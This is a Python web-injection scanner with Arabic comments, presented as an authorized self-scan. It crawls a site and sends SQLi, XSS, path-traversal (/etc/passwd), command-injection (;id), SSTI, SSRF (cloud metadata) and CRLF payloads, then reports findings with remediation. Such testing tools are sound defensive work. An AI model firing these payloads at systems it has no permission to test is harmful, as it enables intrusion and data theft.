#!/usr/bin/env python3
"""
probe.py — فحوص الحقن (Injection Probes) على نقاط الإدخال في نظامك.

الأayloads كلها **غير هدّامة**: markers فريدة + استعلامات قراءة فقط.
لا يوجد DROP/DELETE/UPDATE، ولا payload على وسطاء إنتاجية بلا إذن.

الفحوص:
  SQLi   — خطأ قائم، فرق منطقي (true/false)، زمني (sleep)
  XSS    — انعكاس marker غير مُهرَّب
  Path traversal — محاولات الخروج من مجلد الويب
  Command injection — أوامر قراءة فقط (id / whoami)
  SSTI   — {{7*7}} / ${7*7}
  SSRF   — انعكاس عناوين داخلية في رسائل الخطأ
  CRLF   — حقن ترويسات

الاستخدام:
    python security/probe.py https://example.com
    python security/probe.py https://example.com --url "https://example.com/search?q=test" --param q
    python security/probe.py https://example.com --only sqli,xss --timeout 15
"""
from __future__ import annotations

import argparse
import json
import os
import re
import sys
import time
import uuid
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from typing import Any
from urllib.parse import parse_qs, urlencode, urljoin, urlparse, urlunparse

try:
    import requests
except ImportError:  # pragma: no cover
    sys.exit("مطلوب requests → pip install -r security/requirements.txt")

UA = "SecProbe/1.0 (authorized self-scan)"
SEV_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}


@dataclass
class Finding:
    id: str
    title: str
    severity: str
    category: str
    target: str
    param: str = ""
    detail: str = ""
    evidence: str = ""
    remediation: str = ""


@dataclass
class Report:
    target: str = ""
    started: str = ""
    finished: str = ""
    probes_run: int = 0
    findings: list[Finding] = field(default_factory=list)
    facts: dict[str, Any] = field(default_factory=dict)

    def add(self, **kw) -> None:
        self.findings.append(Finding(**kw))

    def summary(self) -> dict:
        c: dict[str, int] = {}
        for f in self.findings:
            c[f.severity] = c.get(f.severity, 0) + 1
        return c

    def to_json(self) -> str:
        return json.dumps({
            "target": self.target, "started": self.started, "finished": self.finished,
            "probes_run": self.probes_run, "summary": self.summary(),
            "facts": self.facts, "findings": [asdict(f) for f in self.findings],
        }, ensure_ascii=False, indent=2)

    def to_md(self) -> str:
        s = self.summary()
        out = [f"# تقرير فحوص الحقن — {self.target}", "",
               f"- **البداية:** {self.started}", f"- **النهاية:** {self.finished}",
               f"- **عدد الفحوص المُنفَّذة:** {self.probes_run}",
               f"- **الملخص:** " + " | ".join(f"{k}: {v}" for k, v in sorted(s.items(), key=lambda x: SEV_ORDER.get(x[0], 9))),
               "", "| # | الخطورة | النوع | الهدف | الملاحظة |", "|---|---------|------|-------|----------|"]
        ordered = sorted(self.findings, key=lambda f: (SEV_ORDER.get(f.severity, 9), f.id))
        for i, f in enumerate(ordered, 1):
            out.append(f"| {i} | {f.severity.upper()} | {f.category} | `{f.target}` | {f.title} |")
        out.append("")
        for i, f in enumerate(ordered, 1):
            out += [f"### {i}. {f.title}  `[{f.id}]`", f"- **الخطورة:** {f.severity}",
                    f"- **الهدف:** `{f.target}`", f"- **المعامل:** `{f.param}`"]
            if f.detail:
                out.append(f"- **التفسير:** {f.detail}")
            if f.evidence:
                out += ["", "```", f.evidence[:1500], "```", ""]
            if f.remediation:
                out.append(f"- **الإصلاح:** {f.remediation}")
            out.append("")
        return "\n".join(out)


# ------------------------------------------------------------------
# اكتشاف نقاط الإدخال
# ------------------------------------------------------------------

CANDIDATE_PATHS = [
    "/", "/index.php", "/index.html", "/search", "/search.php", "/search?q=",
    "/api/search", "/api/v1/search", "/product", "/products", "/item",
    "/api/item", "/api/products", "/user", "/profile", "/api/user", "/api/users",
    "/login", "/login.php", "/signup", "/register", "/api/login", "/api/auth/login",
    "/api/token", "/api/session", "/api/orders", "/api/orders/1", "/api/trades",
    "/api/balance", "/api/portfolio", "/api/wallet", "/api/quote", "/api/price",
    "/api/swap", "/api/trade", "/api/positions", "/api/signals", "/api/alerts",
    "/api/config", "/api/settings", "/api/webhook", "/api/notify",
    "/panel", "/dashboard", "/admin", "/reset-password", "/forgot-password",
    "/news", "/blog", "/post", "/article", "/download", "/file", "/redirect", "/go",
]

DEFAULT_PARAMS = ["q", "query", "search", "id", "uid", "user", "page", "offset", "limit",
                   "sort", "order", "filter", "category", "mint", "address", "wallet",
                   "symbol", "token", "amount", "from", "to", "redirect", "url", "next",
                   "lang", "token", "api_key", "ref", "code", "email", "name"]


def discover_targets(client: requests.Session, base: str, extra_urls: list[str], extra_params: list[str]) -> list[tuple[str, str]]:
    """يعيد قائمة (url, param) لكل نقطة إدخال محتملة."""
    found: list[tuple[str, str]] = []
    seen: set[tuple[str, str]] = set()

    def add(u: str, p: str) -> None:
        k = (u, p)
        if k not in seen:
            seen.add(k)
            found.append(k)

    # 1) روابط من الصفحة الرئيسية تحمل query
    try:
        r = client.get(base, timeout=12)
        html = r.text if r is not None else ""
        for m in re.finditer(r'href\s*=\s*["\']([^"\']*\?[^"\']+)', html, re.I):
            link = urljoin(base, m.group(1))
            for p in parse_qs(urlparse(link).query):
                add(link, p)
        # 2) حقول النماذج
        for form in re.finditer(r"<form[^>]*>(.*?)</form>", html, re.I | re.S):
            action = re.search(r'action\s*=\s*["\']([^"\']*)', form.group(1), re.I)
            a = urljoin(base, action.group(1)) if action else base
            for inp in re.finditer(r'<(?:input|textarea|select)[^>]*name\s*=\s*["\']([^"\']+)', form.group(1), re.I):
                add(a, inp.group(1))
        # 3) استدعاءات fetch/axios داخل JS مضمّن
        for m in re.finditer(r"""(?:fetch|axios\.(?:get|post)|url)\s*\(?\s*['"`]([^'"`?]*\?[^'"`]*)""", html):
            link = urljoin(base, m.group(1))
            for p in parse_qs(urlparse(link).query):
                add(link, p)
    except requests.RequestException:
        pass

    # 4) مسارات مرشحة + معاملات افتراضية
    for p in CANDIDATE_PATHS:
        u = urljoin(base, p)
        r = None
        try:
            r = client.get(u, timeout=8, allow_redirects=False)
        except requests.RequestException:
            continue
        if r is None or r.status_code >= 400:
            continue
        qp = parse_qs(urlparse(u).query)
        if qp:
            for k in qp:
                add(u, k)
        else:
            for name in DEFAULT_PARAMS[:6]:
                add(u, name)

    # 5) معاملات وم urls إضافية من المستخدم
    for u in extra_urls:
        qp = parse_qs(urlparse(u).query)
        if qp:
            for k in qp:
                add(u, k)
        else:
            for name in (extra_params or DEFAULT_PARAMS[:6]):
                add(u, name)
    for p in extra_params:
        add(base, p)

    return found


def build(url: str, param: str, value: str) -> str:
    parts = urlparse(url)
    q = parse_qs(parts.query, keep_blank_values=True)
    q[param] = [value]
    return urlunparse(parts._replace(query=urlencode(q, doseq=True)))


# ------------------------------------------------------------------
# الفحوص
# ------------------------------------------------------------------

SQL_ERROR_MARKERS = [
    "you have an error in your sql syntax", "sqlstate", "mysql_fetch_array",
    "pg_query()", "postgresql query failed", "sqlite3::query", "odbc sql server driver",
    "unclosed quotation mark", "quoted string not properly terminated",
    "warning: mysql", "ora-00933", "ora-01756", "sqlite/jdbcdriver",
    "microsoft ole db provider for sql server", "pg_query", "syntax error at or near",
    "com.mysql.jdbc.exceptions", "org.postgresql.util.PSQLException",
    "javax.persistence", "sql exception", "hqlsyntaxerror",
]

SQLI_PAYLOADS = [
    ("sqli_err_quote", "'", "خطأ قائم باقتباس مفرد"),
    ("sqli_bool_true", "' OR '1'='1", "فرق منطقي (true)"),
    ("sqli_bool_false", "' AND '1'='2", "فرق منطقي (false)"),
    ("sqli_union", "' UNION SELECT NULL,NULL--", "UNION SELECT"),
    ("sqli_sleep", "' OR SLEEP(3)--", "زمني SLEEP"),
    ("sqli_sleep2", "1; SELECT pg_sleep(3)--", "زمني pg_sleep"),
]

XSS_PAYLOADS = [
    ("xss_script", "<script>alert(1)</script>", "وسم script"),
    ("xss_img", '"><img src=x onerror=alert(1)>', "معالج حدث onerror"),
    ("xss_svg", "<svg/onload=alert(1)>", "svg onload"),
    ("xss_js", "javascript:alert(1)", "javascript: URI"),
    ("xss_attr", "' onmouseover='alert(1)", "كسر سمة"),
]

TRAVERSAL_PAYLOADS = [
    ("trav_passwd", "../../../../../../etc/passwd", "قراءة /etc/passwd"),
    ("trav_win", "..\\..\\..\\..\\Windows\\win.ini", "قراءة win.ini"),
    ("trav_enc", "....//....//....//etc/passwd", " تجاوز فلاتر ../"),
    ("trav_proc", "/proc/self/environ", "قراءة /proc/self/environ"),
]

CMD_PAYLOADS = [
    ("cmd_id", ";id", "أمر id"),
    ("cmd_id_pipe", "|id", "أمر id عبر pipe"),
    ("cmd_id_sub", "$(id)", "استبدال $(id)"),
    ("cmd_id_backtick", "`id`", "backtick id"),
    ("cmd_whoami", ";whoami", "أمر whoami"),
]

SSTI_PAYLOADS = [
    ("ssti_jinja", "{{7*7}}", "Jinja2 {{7*7}}"),
    ("ssti_django", "${7*7}", "EL ${7*7}"),
    ("ssti_freemarker", "<%= 7*7 %>", "FreeMarker"),
    ("ssti_twig", "{{7*'7'}}", "Twig"),
]

SSRF_PAYLOADS = [
    ("ssrf_meta", "http://169.254.169.254/latest/meta-data/", "بيانات وصفية سحابية"),
    ("ssrf_local", "http://127.0.0.1/", "localhost"),
    ("ssrf_internal", "http://10.0.0.1/", "شبكة داخلية"),
]

CRLF_PAYLOADS = [
    ("crlf", "%0d%0aX-Injected: probe", "حقن ترويسة CRLF"),
]


def probe(client: requests.Session, report: Report, url: str, param: str, only: set[str]) -> None:
    base_val = "probe1"
    try:
        b = client.get(build(url, param, base_val), timeout=12, allow_redirects=False)
    except requests.RequestException:
        return
    if b is None:
        return
    report.probes_run += 1
    base_body, base_len, base_time = b.text, len(b.content), b.elapsed.total_seconds()
    base_status = b.status_code

    def run(payload: str) -> requests.Response | None:
        try:
            return client.get(build(url, param, payload), timeout=15, allow_redirects=False)
        except requests.RequestException:
            return None

    # ---------- SQLi ----------
    if "sqli" in only:
        for pid, payload, desc in SQLI_PAYLOADS:
            r = run(payload)
            if r is None:
                continue
            report.probes_run += 1
            body = r.text
            low = body.lower()
            hit = [m for m in SQL_ERROR_MARKERS if m in low]
            if hit:
                report.add(id="SQLI-001", title=f"حقن SQL — خطأ قاعدة بيانات ({desc})", severity="high",
                           category="SQLi", target=url, param=param,
                           detail=f"الخادم أعاد رسالة خطأ SQL ({hit[0]}) — الحقن يصل إلى قاعدة البيانات.",
                           evidence=body[:600],
                           remediation="استخدم استعلامات مُعامَلة (parameterized queries) ولا تدمج مدخلات المستخدم في نص SQL.")
                break
            if "sleep" in pid:
                if r.elapsed.total_seconds() > 2.5 and base_time < 2.0:
                    report.add(id="SQLI-002", title="حقن SQL — استجابة زمنية (time-based)", severity="high",
                               category="SQLi", target=url, param=param,
                               detail=f"الاستجابة تأخّرت {r.elapsed.total_seconds():.1f}s مقابل {base_time:.1f}s.",
                               evidence=f"payload={payload} elapsed={r.elapsed.total_seconds():.2f}s",
                               remediation="استخدم استعلامات مُعامَلة وقلّل صلاحيات قاعدة البيانات.")
                    break
            if pid == "sqli_bool_true":
                rt = run("' AND '1'='2")
                if rt is not None:
                    report.probes_run += 1
                    if base_status != rt.status_code or abs(len(rt.content) - base_len) > max(40, base_len * 0.1):
                        report.add(id="SQLI-003", title="حقن SQL — فرق منطقي (boolean-based)", severity="high",
                                   category="SQLi", target=url, param=param,
                                   detail="استجابة true/false تختلف بشكل واضح — الشرط يُنفَّذ في قاعدة البيانات.",
                                   evidence=f"true: {base_status}/{base_len}B\nfalse: {rt.status_code}/{len(rt.content)}B",
                                   remediation="استخدم parameter binding وتجنّب بناء الاستعلامات بدمج النصوص.")
                        break

    # ---------- XSS ----------
    if "xss" in only:
        for pid, payload, desc in XSS_PAYLOADS:
            r = run(payload)
            if r is None:
                continue
            report.probes_run += 1
            body = r.text
            marker = payload[:12]
            if marker in body and "<script" in body.lower() and body.lower().count("<script") > body.lower().count("<\\/script"):
                report.add(id="XSS-001", title=f"XSS مُعكَس (reflected) — {desc}", severity="high",
                           category="XSS", target=url, param=param,
                           detail="الـ payload انعكس في الاستجابة بدون تهريب — قابل للتنفيذ في متصفح الضحية.",
                           evidence=body[:600],
                           remediation="هرّب كل المخرجات (HTML entity encoding) وطبّق CSP صارمة + HttpOnly للكوكيز.")
                break
            if 'onerror=alert(1)' in body.lower() or 'onload=alert(1)' in body.lower():
                report.add(id="XSS-002", title="XSS مُعكَس — معالج حدث بدون تهريب", severity="high",
                           category="XSS", target=url, param=param, evidence=body[:600],
                           detail="سمة معالج حدث انعكست حرفياً في الصفحة.",
                           remediation="هرّب المخرجات وتحقّق من المدخلات على خادمك.")
                break

    # ---------- Path traversal ----------
    if "trav" in only:
        for pid, payload, desc in TRAVERSAL_PAYLOADS:
            r = run(payload)
            if r is None:
                continue
            report.probes_run += 1
            body = r.text
            if "root:x:0:0:" in body or "[extensions]" in body or "HOME=" in body or "http_proxy" in body:
                report.add(id="TRAV-001", title=f"اجتياز المسار (Path Traversal) — {desc}", severity="critical",
                           category="Path Traversal", target=url, param=param,
                           detail="قراءة ملف نظام خارج مجلد الويب — تسريب ملفات الخادم.",
                           evidence=body[:600],
                           remediation="طبّع المسار (realpath) وتأكد أنه داخل المجلد المسموح، وامنع ../ و%2e%2e.")
                break

    # ---------- Command injection ----------
    if "cmd" in only:
        for pid, payload, desc in CMD_PAYLOADS:
            r = run(payload)
            if r is None:
                continue
            report.probes_run += 1
            body = r.text
            if re.search(r"\buid=\d+\(|\broot:x:0:0:|www-data", body):
                report.add(id="CMD-001", title=f"حقن أوامر (Command Injection) — {desc}", severity="critical",
                           category="Command Injection", target=url, param=param,
                           detail="النظام نفّذ أمراً على الخادم — اختراق كامل للخادم.",
                           evidence=body[:600],
                           remediation="لا تمرّر مدخلات المستخدم إلى shell — استخدم subprocess بقائمة args وبدون shell=True.")
                break

    # ---------- SSTI ----------
    if "ssti" in only:
        for pid, payload, desc in SSTI_PAYLOADS:
            r = run(payload)
            if r is None:
                continue
            report.probes_run += 1
            if "49" in r.text and ("7*7" in r.text or "7*7" not in r.text and re.search(r"\b49\b", r.text)):
                report.add(id="SSTI-001", title=f"حقن قوالب (SSTI) — {desc}", severity="high",
                           category="SSTI", target=url, param=param,
                           detail="تعبير 7*7 نُفِّذ داخل القالب — قراءة متغيرات وسيرفر خطأ محتمل.",
                           evidence=r.text[:400],
                           remediation="لا تدمج مدخلات المستخدم في القوالب؛ استخدم سياقاً معزولاً وطبّق allowlist.")
                break

    # ---------- SSRF ----------
    if "ssrf" in only:
        for pid, payload, desc in SSRF_PAYLOADS:
            r = run(payload)
            if r is None:
                continue
            report.probes_run += 1
            body = r.text
            if "169.254.169.254" in body and ("meta-data" in body or "iam" in body.lower() or "accessKey" in body):
                report.add(id="SSRF-001", title=f"SSRF — وصول لبيانات وصفية السحابة ({desc})", severity="critical",
                           category="SSRF", target=url, param=param,
                           detail="الخادم جلب عنواناً داخلياً/خادمياً وعرض محتواه — تسريب بيانات اعتماد السحابة.",
                           evidence=body[:600],
                           remediation="طبّق allowlist للمضيفين المسموحين، امنع الشبكات الخاصة (10/8, 127/8, 169.254/16) بعد DNS resolution.")
                break
            if re.search(r"(?:curl|requests|wget)[^\n]{0,40}(?:10\.\d+\.\d+\.\d+|127\.0\.0\.1)", body, re.I) and len(body) < 2000:
                report.add(id="SSRF-002", title=f"SSRF — عنوان داخلي في المخرجات ({desc})", severity="medium",
                           category="SSRF", target=url, param=param, evidence=body[:400],
                           detail="الاستجابة تعكس عنواناً داخلياً — مؤشر على أن الخادم يجلب العناوين.",
                           remediation="قيّد الوجهات المسموحة وتحقّق بعد الـ DNS resolution.")
                break

    # ---------- CRLF ----------
    if "crlf" in only:
        for pid, payload, desc in CRLF_PAYLOADS:
            r = run(payload)
            if r is None:
                continue
            report.probes_run += 1
            if "x-injected" in {k.lower() for k in r.headers}:
                report.add(id="CRLF-001", title="حقن ترويسات (CRLF injection)", severity="medium",
                           category="CRLF", target=url, param=param,
                           detail="القيمة المُدخلة وصلت كترويسة مستجيب — تسريب بيانات/ cache poisoning.",
                           evidence="\n".join(f"{k}: {v}" for k, v in r.headers.items()),
                           remediation="امنع CRLF في مدخلات الترويسات (تجنّب echo للمعاملات في الترويسات).")
                break


# ------------------------------------------------------------------


def main() -> None:
    ap = argparse.ArgumentParser(description="فحوص حقن على نقاط إدخال نظامك")
    ap.add_argument("target", help="رابط الموقع")
    ap.add_argument("--url", action="append", default=[], help="رابط إضافي لفحصه (يمكن تكراره)")
    ap.add_argument("--param", action="append", default=[], help="معامل إضافي (يمكن تكراره)")
    ap.add_argument("--only", default="sqli,xss,trav,cmd,ssti,ssrf,crlf",
                    help="أنواع الفحص المطلوبة (مفصولة بفاصلة)")
    ap.add_argument("--timeout", type=int, default=12)
    ap.add_argument("--out", default="security/findings")
    args = ap.parse_args()

    only = {x.strip() for x in args.only.split(",") if x.strip()}
    report = Report(target=args.target, started=datetime.now(timezone.utc).isoformat(timespec="seconds"))
    s = requests.Session()
    s.headers.update({"User-Agent": UA})

    base = args.target if args.target.endswith("/") else args.target + "/"
    targets = discover_targets(s, base, args.url, args.param)
    report.facts["targets_discovered"] = len(targets)
    print(f"🔎 اكتُشف {len(targets)} نقطة إدخال محتملة — جاري الفحص…")

    for i, (u, p) in enumerate(targets, 1):
        print(f"  [{i}/{len(targets)}] {u} ?{p}", end="", flush=True)
        probe(s, report, u, p, only)
        print(" ✓" if not report.findings else " ⚠")

    report.finished = datetime.now(timezone.utc).isoformat(timespec="seconds")
    if args.out:
        os.makedirs(args.out, exist_ok=True)
        host = urlparse(args.target).netloc.replace(":", "_")
        stamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
        stem = os.path.join(args.out, f"probe_{host}_{stamp}")
        with open(stem + ".json", "w") as f:
            f.write(report.to_json())
        with open(stem + ".md", "w") as f:
            f.write(report.to_md())
        report.facts["report_files"] = [stem + ".json", stem + ".md"]

    s2 = report.summary()
    print(f"\n=== النتيجة: {sum(s2.values())} ملاحظة ===")
    for k, v in sorted(s2.items(), key=lambda x: SEV_ORDER.get(x[0], 9)):
        print(f"  {k.upper():8} {v}")
    if report.facts.get("report_files"):
        print("\n📄 " + ", ".join(report.facts["report_files"]))


if __name__ == "__main__":
    main()
